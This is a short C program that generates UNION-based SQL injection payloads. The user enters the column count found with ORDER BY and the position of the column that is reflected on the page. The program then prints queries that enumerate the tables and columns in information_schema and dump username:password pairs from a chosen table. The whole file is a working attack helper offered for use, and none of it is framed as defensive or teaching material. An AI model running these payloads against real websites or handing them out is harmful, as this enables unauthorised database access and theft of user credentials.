#include<stdio.h>
#include<string.h>
main()
{
	int num,i,vulnum;
	char tbname[100];
	printf("Enter the order by number : ");
	scanf("%d",&num);
	printf("union select ");
	for(i=1;i<num;i++)
	{
		printf("%d,",i);
	}
	printf("%d--",i);
	printf("\n");
	printf("Enter the vul number : ");
	scanf("%d",&vulnum);

	printf("union select ");
	for(i=1;i<num;i++)			// table retrieve
	{
		if(vulnum==i)
			printf("group_concat(table_name),");
		else
			printf("%d,",i);
	}
	if(vulnum==i)
		printf("group_concat(table_name)");
	else
		printf("%d",i);
	printf(" from information_schema.tables where table_schema=database()--\n");

	printf("Enter the table name : ");      //columns
	scanf("%s",&tbname);
	printf("union select ");
	for(i=1;i<num;i++)			
	{
		if(vulnum==i)
			printf("group_concat(column_name),");
		else
			printf("%d,",i);
	}
	if(vulnum==i)
		printf("group_concat(column_name)");
	else
		printf("%d",i);
	printf(" from information_schema.columns where table_name=");
	printf("CHAR(");
	for(i=0;i<strlen(tbname)-1;i++)
		printf("%d,",tbname[i]);
	printf("%d",tbname[i]);
	printf(")--");
	printf("\n");

	printf("union select ");
	for(i=1;i<num;i++)			//data
	{
		if(vulnum==i)
			printf("group_concat(username,0x3a,password),");
		else
			printf("%d,",i);
	}
	if(vulnum==i)
		printf("group_concat(username,0x3a,password)");
	else
		printf("%d",i);
	printf(" from %s--\n",tbname);
}
